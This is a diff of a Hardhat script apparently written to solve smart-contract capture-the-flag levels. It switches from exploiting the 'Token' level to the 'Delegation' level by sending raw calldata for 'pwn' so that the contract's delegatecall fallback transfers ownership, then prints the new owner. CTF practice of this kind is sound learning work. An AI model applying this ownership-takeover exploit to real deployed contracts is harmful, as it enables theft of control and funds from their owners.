@@ -2,8 +2,8 @@ const hre = require("hardhat");
 async function main() {
     
     //Params
-    levelAddress = "0xE067a5c0d9c403d15892bBf7A7FfAe841A5A4eB5";
-    contractName = "Token";
+    levelAddress = "0x0Eda882D9a2e4c589Cf6541162C059Ce0F58f83C";
+    contractName = "Delegation";
 
     const account = await hre.ethers.getSigner();
     console.log(`Working with account ${account.address}`);
@@ -14,9 +14,23 @@ async function main() {
     // const attacker = await Attacker.deploy(levelAddress);
     // console.log(`Attacker at ${attacker.address}`);
 
-    let tx = await level.transfer("0x63bE8347A617476CA461649897238A31835a32CE",21);
+    const abi = require("./contracts_6_Delegation_sol_Delegate.json");
+    const iface = new hre.ethers.utils.Interface(abi);
+    var data = iface.encodeFunctionData("pwn");
+    console.log(data)
+
+    
+    gas_price = await hre.ethers.provider.getGasPrice();
+    let tx = await account.sendTransaction({
+        to: levelAddress,
+        gasLimit: "0x100000",
+        gasPrice: gas_price,
+        data: data
+        
+    });
     let tr = await tx.wait();
-    console.log(await level.balanceOf(account.address));
+
+    console.log(await level.owner());
 
     
 }
